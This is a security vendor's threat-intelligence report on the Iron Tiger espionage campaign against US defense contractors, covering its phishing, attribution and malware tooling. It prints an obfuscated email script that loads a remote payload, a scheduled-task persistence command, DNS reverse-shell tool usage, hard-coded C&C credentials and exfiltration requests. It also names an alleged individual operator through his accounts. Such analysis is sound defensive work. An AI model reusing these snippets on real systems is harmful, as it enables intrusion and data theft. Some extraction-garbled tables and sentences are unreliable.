Operation Iron Tiger: Exploring Chinese Cyber-Espionage Attacks on United States DefenseContractorsZiv Chang, Kenney Lu,Aaron Luo, Cedric Pernet,Jay Yaneza(Trend Micro Cybersafety Solutions Team)Contents4 Targets: From Asia-Pacific to the US8 Actors: Tracing the operation’s Chinese roots11 Operation: Iron Tiger hacks targets’ defenses51 Mitigation: Combating cyber espionage and targeted attacksIf a single piece of valuable information can put a nation at a disadvantage, what could much more stolen data do? A group of China-based threat actors known as “Emissary Panda1” or “Threat Group-3390 (TG-3390)2” may know the answer, as they have been seen stealing terabytes of confidential data from employees of high-technology companies in the United States (US) since 2013.Their target? Government defense contractors and related companies. They specifically targeted the directors and managers of US companies in the electric, aerospace, intelligence, telecommunications, energy, and nuclear engineering industries, among others. Looking at the targets, we believe the attackers constantly monitored technology-inclined US government contractors.In a cyber-espionage operation we dubbed “Iron Tiger,” the actors first spent years spying on political targets and government agencies in China, Hong Kong, and the Philippines back in 2010 before eyeing technology-related organizations in the US. Given the huge geographical shift in target, it is very likely that Iron Tiger is only part of a bigger campaign where specific targets are assigned to various teams.The actors have stolen emails, full Active Directory® dumps, intellectual property, strategic planning documents, and budget- or finance-related content—all of which can be used to sabotage target governments’ or private organizations’ plans. We’ve even seen them nab up to 58GB worth of data from a single target. They could have even stolen terabytes of data in total.We found convincing evidence pointing to China as the threat actors’ primary location. These indicators include the use of virtual private network (VPN) servers that only accepted China- based registrants, Chinese file names and passwords, and China-registered domains. Specifically following two virtual aliases, “phpxss” and “ershao,” we were able to attribute operational activities to a key personality physically located in China.Note that the actors are skilled in launching digital attacks. They not only followed new malware- creation tool releases but also used customized tools like dnstunserver and abused legitimate services like Blogspot™ and the Google Cloud Platform™. Using legitimate services allowed them to evade monitoring and efficiently change command-and-control (C&C) servers in case of discovery.While their techniques may be quite advanced, they adapt to their target networks’ security levels and sparingly used sophisticated methods. Like any organized and motivated team, they exerted minimal effort to achieve maximum results.Targets: From Asia-Pacific to the USQuality trumps quantity as far as Iron Tiger goes. It targets fewer individuals and organizations compared with other campaigns like Russia-based cyber-espionage operation, Pawn Storm3. Yet like Pawn Storm, Iron Tiger also spies on organizations where they are based.China — 2010 Education Hong Kong — 2010 Others (political organizations) Others (political organizations) United States — 2013 Technology United States — 2013 Telecommunications United States — 2013 Energy United States — 2013 ManufacturingGlobal distribution of Iron Tiger’s targetsThe actors first monitored targets in the education industry in China, political dissidents in Hong Kong, government agencies in the Philippines, and political targets in Tibet as far back as 2010. We believe individual targets from each country were picked to gather inside information on political events that prevailed at the time.The actors use spear-phishing email subjects that would be interesting to their chosen targets. They used “Han Zheng stays at Regent Pan—Housing protest held in advance” as lure to entice curious political targets to join a protest against then-mayor of Shanghai4. Other subjects exposed the attackers’ aim to target very important persons (VIPs), engineers, and/or public relations (PR) or communication officers.4 | Operation Iron TigerSample spear-phishing email sent to targets (subject in English, “Han Zheng stays at Regent Pan—Housing protest held in advance”)In 2013, Iron Tiger’s targets changed. After achieving cyberspying feats, the attackers set out to catch bigger fish—individuals in defense- and technology-related fields like aerospace, energy, intelligence, nuclear engineering, and telecommunications. Looking at the targets, we believe the attackers constantly monitored high-technology contractors of the US government.Up to terabytes of stolen dataThe actors are believed to have stolen up to terabytes of data, given the sheer amount of information they gathered from each target. They were able to extract as much as 58GB worth of data from a single organization. This was even more than the 40GB worth of data leaked after the Sony Pictures hack5.5 | Operation Iron TigerEmailsFull ActiveDirectory dumpsIntellectual propertyStrategic planningdocumentsBudget-/Finance- related contentTypes of data stolen by the Iron Tiger actorsA compromised Microsoft® Exchange™ server showed that Iron Tiger uses various exfiltration routines. They install two different backdoors— BKDR_PLUGX.XXT and Dllshellexc2010 (which specifically affects Microsoft Exchange). They rename files prior to extraction using extensions like .CSS to bypass security protections put in place for archived files (.ZIP, .7z, .RAR, etc.).Actual content found inside a 58GB archivestolen from a single target organizationContent of a .7z file named “txt.css” generatedby the attackers on a compromised network6 | Operation Iron TigerThe actors also use Robocopy, an application that lets users remotely copy files to local hard drives in order to extract them from a server. Finally, they export mailboxes to a .PST file using the “Export-Mailbox” PowerShell command. Data meant to be stolen is always stored as encrypted .7z files in the Microsoft Outlook® Web App (OWA) folder.With all of the files in their hands, the actors may knoweverything about the network and its users, making lateralmovement possible. The possibilities are endless. At this point, they obtain the highest privilege levels on the compromisednetwork.7 | Operation Iron TigerActors: Tracing the operation’s Chinese rootsThe following pieces of evidence revealed that the Iron Tiger actors can be Chinese-speaking individuals proficient in computer security and launching digital attacks:• The VPN servers were mostly located in China like those provided by BAIGE VPN.• The file names and passwords used were Chinese.•Some text resources and language IDs used in malware binaries were set to simplified Chinese.• HUC Packet Transmit Tool (HTran) is frequently used by Chinese threat actors.• Whois data revealed that related domains like shangxian.info were registered with physical addressesin China.• The other related resources (QQ, Lofter, 163.com) are popularly used in China.Is “Fei” behind Iron Tiger?Following virtual aliases related to Iron Tiger allowed us to attribute operational activities to a key personality—Guo Fei—who resides in Shanghai, China.Phpxss and exenullThe systematic use of these two nicknames, their use of the same password to encrypt files, and the way they accessed C&C servers made us believe that only a few key individuals rather than a huge group of people were behind the campaign. Phpxss was probably a reference to cross-site scripting (XSS) vulnerabilities based on PHP. This choice of nickname made us believe that the actor had ties to traditional cybercrime.Phpxss had ties to xssok.blogspot.com and phpxss.lofter.com—C&C servers for three Trojans (dnstunnel, NBDDOS, and PlugX) related to Iron Tiger. The malicious tool, dnstunclient, accesses xssok.blogspot.com to know what the controlling IP address is. A Gh0st variant, meanwhile, accesses phpxss.lofter.com, which leads to a C&C server.Phpxss also serves as username for several email addresses from different free email providers and the BAIGE-VPN-provided service. One of the subdomains under shangxian.info that points to a C&C server has also been registered with the name, “php xss,” and the email address, [REDACTED]s @ gmail . com.8 | Operation Iron TigerRegistrant Email: [REDACTED]s @ gmail . comRegistrant Name: php xss Registrant Organization: Registrant Street: shanghairoad Registrant City: shanghai Registrant State/Province: sldkkk Registrant Postal Code: 200000 Registrant Country: CN Registrant Phone: +86.[REDACTED]53232Whois information tied to shangxian.info and registered by php xssWe also found a blog comment with the name, “phpxss,” which led to an email address; a QQ number (693149); and the name, “Guo Fei.” Additional research on the QQ number led us to a person named “郭飞,” which translates to “Guo Fei.” The name, “exenull,” meanwhile, was used by the same person to register on target sites or forums.Comment by phpxss linked to a Gmail accountand QQ number owned by Guo FeiPhpxss’s geographical information9 | Operation Iron TigerQQ Insight Labs overview of the QQ number, “693149”More information on the QQ number, “693149”Ershao and myershaoErshao and myershao were other nicknames tied to the name, “Guo Fei.” These were found in leaked underground forum databases and had ties to the same QQ number that phpxss used. A related email address found in underground forums, [REDACTED]o @ live . cn, was also used to register the domain, mai1.info, which had ties to Iron Tiger.10 | Operation Iron TigerOperation: Iron Tiger hacks targets’ defensesThe Iron Tiger actors can be skilled computer security experts but sparingly used advanced techniques, given their weakly protected target networks. They do not follow a specific schedule when it came to launching attacks. Instead, they prioritize attacks based on a list of chosen targets. We have, for instance, seen them dump the contents of a company’s Active Directory database nine months prior to actual data exfiltration.IIS exploit binaries (CVE-2008-1436)GTalkTrojanHTTPBrowserNBDDOSDnstunclientGoogle Cloud Platform Trojan2010201120122013201420152016QuarksPwDumps.exeDllshellexc2010PlugXRing RATPlugXMalware and tools that Iron Tiger used sorted by compilation dateInvestigations revealed several Iron Tiger-specific routines. The actors are fond of using customized hacking tools like dnstunserver and known targeted attack malware, PlugX and Gh0st variants, to remotely access target networks.The attackers abuse free Web services to accomplish their goals. They set up C&C servers in the free blogging platform, Blogspot; connected a Gh0st variant to the Chinese blogging platform, Lofter; and created email11 | Operation Iron Tigeraccounts in Gmail™ and Microsoft Outlook. They also maintain a clean and controlled command center, going as far as patching one of the C&C servers they compromised and running the WebShellKill backdoor finder on it to keep cybercriminals or script kiddies away.When laterally moving inside networks, they use a stolen code-signing certificate from Korea-based security company, SoftCamp Co., Ltd., to evade security solutions. To get deeper into networks, they intercept Microsoft Exchange™ credentials using Robocopy and the “Export-Mailbox” PowerShell command—both unique means. They also use a Trojan that was specifically designed to only work on the Google Cloud Platform.Spear phishingThe Iron Tiger actors likely gather solid information about organizations they want to infiltrate before zeroing in on specific figure heads. Quick Web searches on how specific organizations formulate email addresses can give them clues on target individuals’ specific addresses. Using these addresses, the attackers have been sending spear-phishing emails to compromise computers in target networks as early as April 2010.The target individuals have varying professional classes, ranging from company executives and government officials to engineers and PR officers. Some of their addresses can be easily found on the Internet. Others are not publicly available, which shows that the attackers have a certain level of maturity in reconnaissance or data gathering.The actors use two addresses to send spear-phishing emails. One of these has been in use since 2010. This is surprising, given that threat actors typically drop email addresses after a short period of time in order to evade detection. This can be a reflection of their confidence that their spear-phishing campaigns will stay undetected regardless.The “From” field in messages sent via both addresses is usually modified to reflect the spear-phishing scheme used for a given target. The attackers often use names that pique the targets’ interests (affiliated with news agencies like the British Broadcasting Corporation [BBC] or the Agence France-Presse [AFP]).Subjects ranging from the generic to the more professional or personal are also used. Samples include “Shanghai mayor Han Zheng visits Taipei to promote World Expo,” “Han Zheng stays at Regent Pan— Housing protest held in advance,” and “Sino-US cooperation on maritime security seminar neighborhoods.”12 | Operation Iron TigerDateIndustry (based onSubjectTranslation25 November 2009Othersrecipient)3 April 20103 April 20106 April 20106 April 2010Communications and mediaOthers (political organizations)Others (political organizations)Others (political organizations)7 April 2010Education7 April 2010 10 April 2010Education Others (political organizations)16 April 2010GovernmentGovernmentGovernmentOthers (political organizations)Others (political organizations)9 July 20109 July 201010 July 201010 July 201010 July 201010 July 201013 | Operation Iron TigerHow about your parents? Smurfs, Bollywood give Shanghai Expo star power Hong Kong lawmakers give lukewarm response to Shanghai Expo trip 上海市長韓正訪問台北推廣世博韓正下榻晶華 綠營提前住房抗議关于中美海上安全合作讲座求教征询 Tashi Delek after long time! (Note that “Tashi Delek” is a Tibetan form of greeting that is usually translated to “Blessings and good luck.”) 2010年度部级法学研究课题申报公告Forging a US-Brazil strategic partnership Brazil’s new security strategy and defense doctrine FW: Tuesday’s meeting at 10 is cancelled FW: Can we meet to discuss your coming trip? RE: Staff meeting is Wednesday at 14:00 The minutes from last week’s board meetingNot applicableNot applicableNot applicableShanghai mayor Han Zheng visits Taipei to promote World Expo Han Zheng stays at Regent Pan—Housing protest held in advance Sino-US cooperation on maritime security Not applicableResearch ministerial declaration of the “2010 Law Bulletin” Not applicableNot applicableNot applicableNot applicableNot applicableNot applicableDateIndustry (based onSubjectTranslation14 July 2010Educationrecipient)3 August 2010Government5 August 20105 August 201017 August 20106 September 201010 September 2010Others (political organizations)25 January 2011Others23 April 2013Government23 April 2013Government23 April 2013Government23 April 2013 25 April 2013Government Government9 May 2014Government9 May 2014Government5 September 201412 October 2014Telecommunications, technology TelecommunicationsHomeland Security and Defense 您好，我是刚毕业的，投简历一份，希望有幸成为贵公司一员Will you come?Not applicableHello, I just graduated, attached is my resume, hoping to get the opportunity to be part of your company Not applicableSummit on nuclear safety issues discussed How about recent days? Not applicableNot applicable2010 Sandia nuclear weapons research topicNot applicable警告钓鱼岛挑衅者，希望不要把中国的愤怒点燃 Backup (Note that this was sent by “Admin.”) The new foreign policy Taiwan’s response to an evolving security Taiwan’s response to an security The future of the US Army Officer Corps jobs! Help me! Help me! not to ignite China’s ire Not applicableNot applicableNot applicableNot applicableNot applicable Not applicableNot applicableNot applicableNot applicableForum needs revisionMore spear-phishing email subjects used in Iron Tiger14 | Operation Iron TigerThe spear-phishing emails had limited content, usually only one or two lines of text. They came with archive file attachments (usually .RAR files) that contained malicious .EXE files.Sample Iron Tiger spear-phishing emailThe email above had a hidden image, which was actually a “Web bug” that allowed attackers to get more information from target systems like IP addresses, browser versions, and others. Some emails had slightly obfuscated code. When deobfuscated, the code tries to run a remote script. We were, unfortunately, unable to retrieve the said js.php script.Email source code that shows the HTML content, including the Web bug15 | Operation Iron Tiger<div id=”code” title=”emailkey=’##REDACTED##’;window.onerror=function(){return true;};if(window.ufoufoufo!=1){framedir=’http://’;framedir=framedir+’##REDAC TED-IPADDRESS##:2687/h/’;yyuser=’##REDACTED E-MAIL ADDRESS##’;_x_=document. createElement(‘SCRIPT’);_x_.src=framedir+’/js.php?key=’+emailkey+’&msg=’+esca pe(‘-’+yyuser+’^-!!-’+document.location);document.insertBefore(_x_,document. getElementsByTagName(‘*’)[0]);ufoufoufo=1;}”></div><style> p,font,table{ top:rgb(‘88’,80,’180); top:rgb(‘) !important height:expression( (window.r==123)?x=8:(eval(code.title)==20088) || (r=123) <p>-</p><font>-</font>Slightly obfuscated code in an Iron Tiger emailhttp://##REDACTED IP ADDRESS:2687/h/js.php?key=##REDACTED##&msg=-##REDACTED E-MAIL ADDRESS##^-!!-document.locationDecoded version of the slightly obfuscated codeArsenalWhile the malware and tools that the actors used were publicly available, some were not at the time this detected by Trend Micro as HKTL_DNSTunnel). This has an interesting way of communicating with the attackers and finding C&C servers. It fetches the home page of a blog, xssok.blogspot.com, with information on how to reach a C&C server. Contacting the blog was registered as a scheduled task on a compromised system, which runs every Sunday at 8:00 A.M. (matching the infected system’s time zone) and fetches the Blogspot page.16 | Operation Iron TigerHome page of xssok.blogspot.comC:\Windows\System32\cmd.exe /C schtasks /create /tn “Microsoft Windows” /tr [FILE NAME] /sc weekly /d SUN /st 08:00:00 /ru System”Code that set when compromised systems should access the blogFormat: “$$$$$$$$$$[Day OF Week]#####[DNS or IP]$$$$$$$$$$” System\Microsoft Windows” /tr [FILE NAME] /sc weekly /d SUN /st 08:00:00 /ru System”Scheduled task code on Windows Vista or newer systemsRunning the scheduled task decodes the information provided by the blog so the system can access the actual C&C server. A reverse command shell then runs using the Domain Name System (DNS) protocol with CNAME and A queries on User Datagram Protocol (UDP) port 53.17 | Operation Iron TigerDNS protocol used as communication channel by a malware variantThe said malware is Base64 encrypted and so can easily be decrypted. Further analysis of the binary revealed that it was a command-line tool that was modified to work on its own. Its original version can be used with arguments like:••dnstunclient -ip <server ip address>dnstunclient -d or -domain <domain>The modified version, meanwhile, forced the use of xssok.blogspot.com.v5 = (int *)argv; *argv = aAaa; argv[1] = aIp_0; //Set argument 1 to –ip v6 = (const char *)sub_402A40(); //get C2 server ip from blog argv[2] = v6; //Set argument 2 to C2 server ipModified tool code that forces the use of xssok.blogspot.com instead of argumentsReverse engineering allowed us to see the tool’s original output. The original dnstunclient is a console program that can be used for temporary lateral movement but it has been modified to act as a Trojan. The modified tool adds extra functions to replace or add parameters while the original always read parameters from the console input. As such, the modified tool grabs parameters from a remote Web page.18 | Operation Iron TigerSample output of the original dnstunclient toolThe “wzrapbia” string the modified tool creates is automatically generated but can’t be used as an indicator of compromise (IoC).Over the past year, Iron Tiger increasingly used similar channels to communicate—an obvious attempt at staying undetected. Log file reviewers will probably classify Blogspot-related requests as legitimate but dnstunclient still only accesses xssok.blogspot.com once a week as a precautionary measure.We monitored xssok.blogspot.com for C&C changes for several months but saw very few modifications. The blog, for instance, moved twice to an internal IP address (192.168.[REDACTED]) before switching again to a compromised server owned by an Asian academic institution.DnstunserverDnstunserver is not available anywhere online, even on underground forums. It was most likely developed DNSTunnel) was compiled just this February. It is dnstunclient’s server part. When launched, it opens a fake DNS service on UDP port 53 and waits for connections from victims. When a connection is established, dnstunserver provides a remote shell that allows the attackers to execute commands on infected computers.Dnstunserver’s server part has interesting debug information like the following paths with Chinese words formed using the Guojia Biaozhun (GB2312) character set, the “national standard” (Note that “桌面” translates to “desktop.”):• C:\Documents and Settings\Administrator\桌面\dns control\t-DNSTunnel\DnsTunServer\dns.cpp• C:\DocumentsandSettings\Administrator\桌面\dnscontrol\t-DNSTunnel\DnsTunServer\DnsTunServer.cpp• C:\DocumentsandSettings\Administrator\桌面\dnscontrol\t-DNSTunnel\DnsTunServer\memory.cpp19 | Operation Iron Tiger• C:\Documents and Settings\Administrator\桌面\dns control\t-DNSTunnel\DnsTunServer\socket.cppExchange backdoor + WebShell = Dllshellexc2010Iron Tiger uses a backdoor called “Dllshellexc2010” by its author on a Microsoft Exchange server that belongs to a target. Dllshellexc2010 is a tool customized for the attackers’ exclusive use. It is a .NET module than 8kB in size) that can be installed on Microsoft Exchange or Internet Information Services (IIS) servers for the purpose of stealing users’ authentication credentials while logging in. It provides a WebShell to the machine, in addition to credential-stealing capabilities.c:\Users\ljw\Documents\prj\dllshell\Dllshell\Dllshellexc2010\obj\Release\ Microsoft.Exchange.Clients.Auth.pdbDebug string found in Dllshellexc2010’s binaryWebShell that Dllshellexc2010 providesThe WebShell does not require any physical ASP.NET file to be present in the IIS directory. It runs every time an HTTP request to any path ending with “x.aspx” is sent. It creates a temporary file called “8xla90ssz7693. tmp” with a tiny WebShell in the %TEMP% folder, which is later executed.Dllshellexc2010’s source code shows that it extracts a parameter called “chopper” when executed, just like the infamous WebShell, 中國菜刀 or China Chopper6. We believe this DLL was created by someone very familiar with China Chopper. We decided to test it in a controlled China Chopper environment and found20 | Operation Iron Tigerthat it worked perfectly. Dllshellexc2010 also intercepts Microsoft Exchange credentials every time a request path that contains “/auth.owa,” a default log-in path for OWA, is used. Note the use of Chinese in the log file generated. Intercepted credentials are written to a hard-coded file called “%TEMP%\~4DAF8B\~P486. jpg” on the infected system’s disk. It uses the .JPG extension even though it is actually a text file.WebShell that Dllshellexc2010 provides inside the China Chopper graphical user interface (GUI)Code used to log usernames and passwordsStolen credentials are written to %TEMP%\~4DAF8B\~P486.jpg21 | Operation Iron TigerSample result of Dllshellexc2010’s credential-stealing capabilityAttacker’s browsing history and related toolsWe were able to examine the browsing history of a C&C server that the actors compromised and saw how they quietly accessed parts of their arsenal (malware and tools) that was hosted elsewhere online. They stored a lot of their usual tools on a mac.pm server, which was hosted in the US and whose name servers are known for having ties to malware-related activities.URLSHA-1/file/dump.7zUnknown/file/7z.exe /tool/dnser.exe/tool/wce.exeLegitimate file GSecDump tool Legitimate .7z compressor Dnstunserver fileLegitimate Windows Credential Editor file Contains Gh0st server Ring.exe variantFiles downloaded by the attackers onto mac.pmThe attackers download a mixture of legitimate and malicious tools, including a famous Windows Credential Editor password dumper, GSecDump, and a .7z compressor.Dnstunserver is also stored on mac.pm, together with a .RAR file that can contain Ring.exe, a Gh0st remote access tool (RAT) variant.The actors also download files that belong to a private South Korean company (whose name we do not wish to disclose) from a compromised domain.URL/webnote/upload/ test/3f.7z/webnote/upload/ FastProxy.exe Cracked version of Internet Download ManagerFiles downloaded from a compromised private South Korean company’s site22 | Operation Iron TigerThe files in the table on the previous page have since been removed. One of the target organizations must have cleaned its Web server.3f.7z, a file downloaded from a compromised server, was encrypted with an unknown password. We were unable to decrypt it but were able to list its contents. The same files related to the PlugX or KorPlug RAT were found on the C&C server. These were likely the contents of 3f.7z.WebShellKillThe Iron Tiger actors downloaded a Chinese tool called “WebShellKill,” which is publicly available. They use an old version (V1.4.1) of the tool even if V1.7.2 was already available at the time this paper was written.WebShellKill features as advertised by its authorIt may be puzzling to find WebShellKill on attackers’ servers because it is used to find backdoors in code (PHP, ASP, VBS, etc.). But since attackers generally plant backdoors anywhere, why would they want to remove them?We quite easily found the answer when we saw the actors compromise a server and immediately launch the tool. The server they chose had several backdoors, which they got rid of via WebShellKill. They probably wanted to make sure the compromised server was clean and could not be easily accessed by script kiddies or even cyberdefenders.23 | Operation Iron TigerThe Iron Tiger actors seem to really care about not being hacked. They went so far as patching a compromised C&C server by logging in as administrator and deploying securityfixes.Google Cloud Platform TrojanThe Iron Tiger actors bought a Trojan that only worked on the Google Cloud Platform. Its C&C server accesses an appspot.com domain. We found a version of the Trojan’s server-side component that was coded in Python. Note that using Python for coding Trojans is unusual. We also found a file called “app.yaml,” which was the Trojan’s configuration file.Client or server options that the Google CloudPlatform Trojan uses/user /dirURLFunctionAffected partyAccesses servers when online Dumps all available clients Checks server status (on standby or working) Turns server on and/or off Starts subcommands (pr, fi, sh, dir, or uninstall) Lists or kills running processes Uploads or downloads files Executes commands Lists directory contentsVictims Victims and attackersVictims and attackers Victims and attackers Victims and attackers Victims and attackersGoogle Cloud Platform Trojan’s functionsThe Trojan was installed on 13 machines that belong to a target company most likely for lateral movement. We also found a variant of its client part that was compiled on 23 March 2015. The sample is named “svchost.exe,” a supposed key Microsoft Windows component. When launched, the binary tries to establish persistence by adding a “Run” registry key named “iisini” to execute the file.24 | Operation Iron TigergeneratedThe Trojan then accesses a C&C server by sending the HTTP GET request, hxxp://exenull1. appspot.com/user?pid=XXXXX&data=XXXXX. It probably tracks victims via unique transmit The data parameter had a Base64-encoded address!Username!Company.” The Trojan’s User-Agent was “WinHTTP Example/1.0” and was likely created for the actors’ exclusive use.that, when decoded, containsoninfectedClient-side properties of the Google CloudPlatform TrojanMalwareThe Iron Tiger actors use three different RATs commonly associated with targeted attacks originating from China.Code that creates a persistence registry key on infected systemsBKDR_PLUGXPlugX7, also known as “Sogu,” “Gulpix,” or “KorPlug,” has been used as a RAT in several targeted attack campaigns. Its author8 or a developer with access to its source code has been updating it on a regular basis.25 | Operation Iron TigerPlugX variants use the DLL side-loading method to infect target computers. DLL side-loading involves abusing a legitimate Windows executable file to load a malicious DLL (PlugX) instead of a legitimate library. All this requires is naming the malicious binary the same as the DLL that attackers wish to execute. PlugX is then loaded instead of the legitimate library in a system folder.Sample PlugX attack scenarioThe actors used the method above to infect computers aided by legitimate binaries from Microsoft or antivirus companies like Symantec and F-Secure. We have seen them use a Microsoft-signed binary, Form.exe. This was malicious code while Form.hlp had the main malware binary and configuration. When the legitimate Form.exe is launched, PlugX:• Copies three components to C:\Windows\System32••Sets the files’ attributes to “hidden” and “system”Sets the files’ time stamps to “2008/04/14”• Creates the service, “Microsoft .Net Framework NGEN 4.0”•Starts a zombie process called “svchost.exe” and injects code• Removes itself from infected systems26 | Operation Iron TigerPlugX infection as seen in the Windows registryPlugX files hidden in system32PlugX SController 3.0SController 3.0 is the internal name of some variants of the PlugX server-side binary. Its GUI, meanwhile, is called “PureICE.” PureICE’s Users panel provides a lot of information about infected machines, including:• Computer name• Local area network (LAN) IP• Wireless LAN (WLAN) IP• Location• Protocol• OS• Languages• Memo• CPU• Memory•Screen resolution• Last online time• Version• CLSIDThe panel also groups infected machines based on user definition though a default group name is always present, “U.S.A.”Default group name configured in PureICE27 | Operation Iron TigerTitle bar of a PlugX server-side binaryThe second panel, Listeners, shows the server settings. It supports Transmission Control Protocol (TCP) and UDP. Note that TCP can accept HTTP or raw TCP transmissions at the same time. Clicking the infected machines’ icons shows the Manager panel.PureICE’s Listener panel’s list of running infected machinesPureICE’s Manager panelPureICE’s GUI had English spelling mistakes. Some features did not even use English, only Chinese. PureICE’s Manager panel had various functions, including:• Disk (file manager)• NetHood manager• File transfer28 | Operation Iron Tiger• Processes (process manager)•Services manager• RegEdit (registry editor)• Netstat manager• PortMap(port-mapping,SOCKS4,or• Capture (screenshot manager)• Control (a kind of Remote Desktop Protocol[RDP] manager)•Shell (remote shell)• Telnet (not a Telnet manager but a DOSemulator)SOCKS5 manager)•SQL (connects to any database via Open Database Connectivity [ODBC])• Keylogger manager• Option (lock, log off, restart, or shut downwith message customization)PlugX has, to our knowledge, never been used by non-Chinese attackers, once again strengthening our assumption that Iron Tiger hails from China.Gh0st variantsWe found several variants of the infamous Gh0st RAT used in Iron Tiger as well.S.exeOne of the Gh0st variants, s.exe (SHA-1: has a lot of obfuscation functions. While it is heavily encrypted, in memory, it is easier to see the infamous string, “Game Over Good Luck By Wind,” appear.S.exe was modified to evade antivirus detection. Some of its functions were also deactivated. It accesses the following C&C servers:•••gameofthrones.ddns.netuser.qzone.qq.com/1479457083ys168.comUnobfuscated strings in the Gh0st variantfound in memoryGameofthrones.ddns.net has been hosted in various countries since February 2015, including the US, Vietnam, and South Korea. Interestingly, one of its domains always points to the IP address, chrome. servehttp.com. We have yet to gather samples accessing the said C&C server though.Ys168.com is a dynamic DNS in the form, <username>.ys168.com. Ys168.com without the subdomain as a C&C server could have been just a mistake on the attackers’ part. This did not have any effect, however, as s.exe could still access other C&C servers.29 | Operation Iron TigerUser.qzone.qq.com/1479457083 was a static link that s.exe used to directly get a C&C server’s IP address from the Web page’s title. This page’s account has been suspended though.Ring RATRing RAT is the internal name of another Iron Tiger-related Gh0st variant compiled just this March. Two unique class names in Ring RAT’s binary—CGh0stDoc and CGh0stView—made it easy to see that it is a Gh0st improvements from Gh0st RAT, including:• The “Active From” field allows attackers to configure specific times to activate malware. This is very useful when they only want to send out data at certain hours that are less visible to victims monitoring network log files.• The “File Type” option allows attackers to only collect files with configured extensions (.DOC, .TXT,.PPT).•“Add D-Signature” allows attackers to add digital signatures to binaries so these would be harder to detect.•“Auto Fection U Disk” allows malware to automatically infect connected USB drives.Ring RAT’s Build Server featuresThe additional features revealed that Ring RAT was built for espionage purposes.Ring RAT is not available in underground forums or anypublicly accessible site. This modified Gh0st RAT could havebeen created for Iron Tiger’s or a closed community’s exclusiveuse.31 | Operation Iron TigerNBDDOSIron Tiger uses another Gh0st RAT variant, NBDDOS. A file named “ver.exe” (SHA-1: was.The DLL was dropped into %TEMP% then moved to %system%. Careful examination and comparison with Gh0st’s code revealed that it was another derivative of the latter. NBDDOS is installed as a service named “MediaCenter.” This can’t be used as an IoC, however, since it can be easily configured using the builder.NBDDOS’s service name and descriptionNBDDOS’s installation function can be modified using a multi-strcat function, probably in an attempt to evade string-based detection. Its C&C server address can be extracted from a Web page or is hard-coded in its binary.Improved NBDDOS installation function32 | Operation Iron TigerTwo C&C server types supported by NBDDOSNBDDOS was configured to retrieve C&C server addresses from a single Web page—phpxss.lofter.com. Lofter.com is a light blogging or social networking service. It also uses “phpxss” as account name.If the Web page option is configured, the IP address and port number must be surrounded by a unique magic string, “$$$$$$$$$$$$.” Two magic strings accompany the C&C server string, which can help serve as an IoC for other security investigators. Compared with the original Gh0st RAT, NBDDOS uses a different encryption function.Web page containing NBDDOS’s C&C server information33 | Operation Iron TigerNBDDOS’s encryption functionNBDDOS also uses a special string, “Vip20141226,” where “20141226” can correspond to the binary’s compilation date. We have no idea though what “Vip” represents. The only reference we found was inside compiled on 8 December 2014 was named “hello.exe.”NBDDOS controller’s GUI34 | Operation Iron TigerMost of the original Gh0st RAT’s functions have been removed from NBDDOS, except for the remote control feature. Its builder supports the C&C server types, namely:• C&C information extracted from a Web pageor file• Use of DNS resolution• Use of direct IP addressesTwo packers—UPX and FSG—are available though users can also generate unpacked malware. Malware service names can be easily changed on infected systems via the same interface.NBDDOS can easily be downloaded from Chinese October 2012, has very few functions, including:• Provides a remote shell• Has a “getfile” feature for data exfiltration (Note that it can only send files from a victim’s computer toa C&C server.)• Has a “settime” feature to set when infected systems should access C&C servers (default: 1 second)35 | Operation Iron Tiger“Getfile” and “settime” functions of GTalkTrojanTo remain persistent, GTalkTrojan adds a RunOnce registry key, HKEY_CURRENT_USER\SOFTWARE\ Microsoft\Windows\CurrentVersion\RunOnce\. It then copies itself into c:\windows\svchost.exe, creates a “cmd” command pipe, and accesses a C&C server—update.gtalklite.com—via port 8080.GTalk Trojan adds the “vnet” registry key to remain persistent36 | Operation Iron Tiger“Cmd” that GTalkTrojan createsC&C server reference in GTalkTrojanWhen a connection is established, GTalkTrojan sends the following information to a C&C server:Computer=<COMPUTER NAME>[USERNAME]&lanip=<LAN IP ADDRESS>&uid=<UID>&os= <OPERATING SYSTEM> followed by command outputNetwork capture showing the data GTalkTrojan sends to a C&C server37 | Operation Iron TigerShould a C&C server require authentication, the following credentials are hard-coded into the binary:Username: idmservice Password: D13idmAdmGTalkTrojan uses the User-Agent, “HttpDump/1.0,” and sends out an MD5 hash as UID for SysDrive- SerialNumber. It used the gtalklite.com domain in its compilation registration.Registrant Contact: zhong meng [REDACTED] sheng li [REDACTED] [REDACTED]j @ 126 . com tel: +86.[REDACTED]97837 fax: +86.[REDACTED]97837 he bei sheng he jian sha wa xiang xi liu wa cun CNGTalkTrojan’s registration informationWe found two other domains registered with the same information though they were not used in any targeted attack operation that we know of.HTTPBrowserinfects systemsHTTPBrowser like PlugX does—via DLL side-loading. One version (SHA-1: Hong Kong at the time this paper was written. It creates a unique GUID that is stored in config.ini	on infected systems. It then accesses a C&C server using the following HTTP GET request:GET /loop?c=[computer]->[user]&l=[ip]&o=[os version]&u=[client id]&r=[inject mode]&t=[time stamp] Host: REDACTED Connection: Keep-Alive User-Agent: HttpBrowser/1.0HTTPBrowser has remote shell-creation, uploading and/or downloading, and file-listing functions, which make it a lightweight RAT that capable of executing more malicious commands or even exfiltrating data. To the best of our knowledge, it is not available in underground forums or other publicly accessible sites. It could have been created for the exclusive use in targeted attacks.Old unpatched servers that can be found online are easy preyto any attacker.File certificate abusersIron Tiger uses three tools signed with the certificates on the next page.39 | Operation Iron TigerIron Tiger uses this certificate signed on 22Certificate’s validity informationNovember 2012The certificate with serial number, 23 92 b8 b2 e1 d5 e9 27 c7 26 37 9b 45 d2 21 ce, valid from 15 September 2012 to 15 November 2014, was issued by Korea-based company, SoftCamp. It was signed on 22 November 2012 and has been used for the Netcat (nc) binary, HTran’s packed version, and a GSecDump binary.It is not clear why the actors decided to sign files but not the malware at the same time and in the same way. We have not seen any of the other file certificates they used. This could be because they did not need them and found that their tools and malware were enough to stealthily move inside target networks. Adding the legitimate file certificate to their arsenal made it easier for the attackers to laterally move throughout networks and collect user credentials without getting noticed. Signed binaries are not often monitored by security solutions.More Iron Tiger toolsAspxSpy2014AspxSpy is a publicly available WebShell. The version that Iron Tiger uses—AspxSpy2014—has been slightly modified though to evade detection.40 | Operation Iron TigerFile nameAspxSpy2014Final.aspx activedsimp.dllSHA-1Description a local exploit plug-in for an old Serv-U FTP Server vulnerability. Finally, activedsimp.dll is an Active Directory service AspxSpy plug-in.Mimikatz, ZhuMimikatz, and Invoke-MimikatzWe found several variants of the Mimikatz password dumper. While some were common versions These allowed Mimikatz to completely work in memory without leaving traces on the 